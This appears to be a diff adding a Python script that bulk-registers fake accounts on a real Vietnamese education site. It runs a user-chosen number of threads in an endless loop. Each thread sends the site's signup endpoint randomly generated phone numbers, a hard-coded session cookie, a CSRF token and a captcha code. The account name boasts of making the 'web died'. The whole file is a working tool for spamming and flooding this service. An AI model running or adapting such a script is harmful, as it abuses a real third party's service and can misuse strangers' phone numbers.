@@ -1,0 +1,83 @@
+import threading,os,requests,json,random,os,time
+os.system("cls")
+print ('''
+   ❤❤❤❤     ❤❤❤❤  ❤❤❤❤❤❤❤         ❤❤❤❤❤❤❤  ❤❤❤                  ❤❤❤
+   ❤❤❤❤     ❤❤❤❤   ❤❤❤❤❤            ❤❤❤❤❤❤    ❤❤❤                ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤        ❤❤❤              ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤          ❤❤❤          ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤            ❤❤❤       ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤             ❤❤❤    ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤               ❤❤❤❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤                ❤❤❤❤❤
+   ❤❤❤❤❤❤❤❤❤❤❤     ❤❤❤                ❤❤❤                  ❤❤❤
+   ❤❤❤❤❤❤❤❤❤❤❤     ❤❤❤                ❤❤❤                  ❤❤❤
+   ❤❤❤❤❤❤❤❤❤❤❤     ❤❤❤                ❤❤❤                  ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤                  ❤❤❤
+   ❤❤❤❤     ❤❤❤❤     ❤❤❤                ❤❤❤                  ❤❤❤
+   ❤❤❤❤     ❤❤❤❤      ❤❤❤              ❤❤❤                   ❤❤❤
+   ❤❤❤❤     ❤❤❤❤       ❤❤❤            ❤❤❤                    ❤❤❤
+   ❤❤❤❤     ❤❤❤❤         ❤❤❤         ❤❤❤                     ❤❤❤
+   ❤❤❤❤     ❤❤❤❤           ❤❤❤❤❤❤❤❤❤                       ❤❤❤
+   ❤❤❤❤     ❤❤❤❤            ❤❤❤❤❤❤❤❤                        ❤❤❤
+          ''')
+wait=input('')
+os.system("cls")
+so_luog=int(input('Số Luồng: '))
+User_Agent=('Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36')
+list_number= ['9', '8', '3' , '5' ]
+while True:
+    def runtest(x):
+        a=random.randint(1, 9)
+        b=random.randint(1, 9)
+        c=random.randint(1, 9)
+        d=random.randint(1, 9)
+        e=random.randint(1, 9)
+        f=random.randint(1, 9)
+        g=random.randint(1, 9)
+        h=random.randint(1, 9)
+        l=random.randint(1, 9)
+        z=random.choice(list_number)
+        mobile=('0'+str(z)+str(a)+str(b)+str(c)+str(d)+str(e)+str(g)+str(h)+str(l))
+        username=('huydeptrai2k7'+str(mobile))
+        headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # Requests sorts cookies= alphabetically
+        'Cookie': '_ga=GA1.2.1263426426.1649596505; _fbp=fb.1.1649596505991.1588323064; G_ENABLED_IDPS=google; __sbmask=acoxarajflzlhbc206c4@usrhlldibidysznbqxjjl; __gads=ID=219da567d14ed7ae-223bfe7807d2008c:T=1650159722:RT=1650159722:S=ALNI_MbwK9BNz75mMvdi2M9BH5ayPzCmIg; _gid=GA1.2.192201786.1655928243; __zi=2000.SSZzejyD3CioZ-UapmOAYc_MeVMKN0R58ill-umUMjSerVsvdWXAatUJ_hVKG4EVU9_piDK4HvfrslEnq0j7cpKuEG.1; pass=; username=; latestCourseId=1648; latestTopicId=7717; latestLessonId=55728; PHPSESSID=e5gn9g6ib0c845atuecmpg7jg1',
+        'Origin': 'https://tuyensinh247.com',
+        'Referer': 'https://tuyensinh247.com/dang-ky.html',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': User_Agent,
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+        data = {
+        'YII_CSRF_TOKEN': '19805c2fa4b69fef75d359a5a9c8cda5392cdc29',
+        'username': username,
+        'password': 'dongvatnguyensinh',
+        're_password': 'dongvatnguyensinh',
+        'mobile': mobile,
+        'fullname': 'Hồ Gia Huy 2007 Hacker Lỏ Oke web died',
+        'secure_code': '3F572',
+    }
+        response = requests.post('https://tuyensinh247.com/eAjax/register', headers=headers, data=data)
+        response=json.loads(response.text)
+        response=response['error']
+        if response==('Đăng ký thành công'):
+            print (response,mobile)    
+    soluong=so_luog
+    threads=[]
+    for x in range (soluong):
+        threads += [threading.Thread(target=runtest,args={x},)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    print ('End task')
